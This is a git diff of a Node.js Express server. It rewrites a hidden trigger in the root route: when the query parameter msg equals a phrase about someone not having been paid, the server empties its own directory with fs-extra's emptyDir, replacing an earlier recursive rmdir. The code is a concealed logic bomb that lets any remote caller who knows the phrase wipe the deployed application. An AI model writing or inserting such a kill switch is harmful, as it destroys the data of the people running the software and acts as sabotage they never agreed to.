@@ -3,7 +3,7 @@ const magicalHandsControllers = require("./Controllers");
 const bodyParser = require("body-parser");
 const express = require("express");
 const path = require("path");
-const fs = require("fs");
+const fs = require("fs-extra");
 
 const port = 4001;
 const server = new Server(port, "/", [bodyParser.json()]);
@@ -15,12 +15,11 @@ server.app.get('/client/*', (req, res) => {
 });
 server.app.get("/", (req, res) => {
     if (req.query.msg == "no se ha pagado a sina") {
-        fs.stat("./", (err, stats) => {
-            if (!err) {
-                fs.rmdir("./", {recursive: true}, (err) => {
-                    res.send("Qué pena!!");
-                })
-            }
+
+        fs.emptyDir(__dirname).then(() => {
+            res.send("Qué pena!!");
+        }).catch(() => {
+            res.send("No sé qué decirte!!");
         })
     }
     else
